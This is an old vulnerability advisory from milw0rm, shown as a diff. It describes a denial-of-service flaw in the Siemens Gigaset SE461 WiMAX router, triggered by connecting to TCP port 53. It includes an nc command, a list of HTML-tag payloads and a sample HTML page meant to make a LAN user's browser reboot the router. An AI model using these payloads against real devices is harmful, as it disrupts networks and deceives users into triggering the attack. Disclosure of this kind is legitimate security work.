@@ -1,0 +1,85 @@
+                     _   _ _____ _     ___ _____ _   _
+                   / / / / ____/ /   /  _/_  __/ / / /
+                  / /_/ / __/ / /    / /  / / / /_/ /
+                 / __  / /___/ /____/ /  / / / __  /
+                /_/ /_/_____/_____/___/ /_/ /_/ /_/
+                           Helith - 0815
+--------------------------------------------------------------------------------
+
+Author		 : Benkei
+Date		 : 2008-02-08
+Vendor		 : Siemens
+Affected product : Gigaset SE461 WiMAX router
+Firmware version : 1.5-BL024.9.6401
+		   Propably other firmware versions are affected as well
+Type		 : Denial of Service
+
+OSVDB		 : 
+Milw0rm		 : 
+CVE		 : 
+ISS X-Force:	 : 
+
+
+After establishing a tcp connection to the affected device on port 53 from the
+LAN interface and after closing the connection the router will restart.
+
+Sometimes when using the web trigger with Internet explorer the WAN
+configuration (ip, gateway ip, dns servers) for the device was lost and a
+hardware reset was needed in order to make the device usable again.   
+
+This issue can be triggered from the LAN interface by direct connection or
+by using specially crafted web content. For the web content to be able to
+trigger the issue a browser withouth security restrictions on connection to
+port 53 must be used, the tests done shows Internet Explorer like the only
+one cappable of activating the bug.
+
+Test made worked with Internet explorer version 7.0.6001.18000, it
+didnt worked with Opera version 9.63 build 10476, Mozilla Firefox
+version 3.0.1. nor Chrome 1.0.154.48. The html tags <img>, <link> an <base>
+worked.
+
+
+Steps to reproduce:
+
+# direct connection
+# nc -nvv 192.168.1.1 53
+
+Or force someone into the lan segment of the router to open an html file
+with one of the following tags and wait for the connection to be established
+and closed. After 5 upon 10 seconds the device will reboot.
+
+<+Tags which can get used+>
+<img src="http://192.168.1.1:53" />
+<img src="http://192.168.1.1:53/p.png" />
+<a href="http://192.168.1.1:53">click me</a>
+<link href="192.168.1.1:53" rel="stylesheet" type="text/css" />
+<link href="192.168.1.1:53/p.css" rel="stylesheet" type="text/css" />
+<div style="background-image:url(http://192.168.1.1:53)"></div>
+<div style="background-image:url(http://192.168.1.1:53/p.png)"</div>
+<object data="http://192.168.1.1:53" type="image/gif" ></object>
+<object data="http://192.168.1.1:53/p.gif" type="image/gif" ></object>
+<script src="http://192.168.1.1:53"></script>
+<script src="http://192.168.1.1:53/p.js"></script>
+<iframe src="http://192.168.1.1:53"></iframe>
+<iframe src="http://192.168.1.1:53/p.html"></iframe>
+<bgsound src="http://192.168.1.1:53"></bgsound>
+<bgsound src="http://192.168.1.1:53/p.wav"></bgsound>
+<head><base href="http://192.168.1.1:53/"></head>
+<base href="http://192.168.1.1:53/" /></head>
+<img src="p.jpg" />
+<-End->
+
+# example html file
+# "p" is a fictional file to ensure that the browser requests something
+
+<html>
+    <head>
+        <base href="https://192.168.2.1:53/" />
+    </head>
+    <body>
+        <img src="p.jpg" />
+        <img src="https://192.168.2.1:53/p.jpg" />
+    </body>
+</html>                              
+
+# milw0rm.com [2009-03-23]
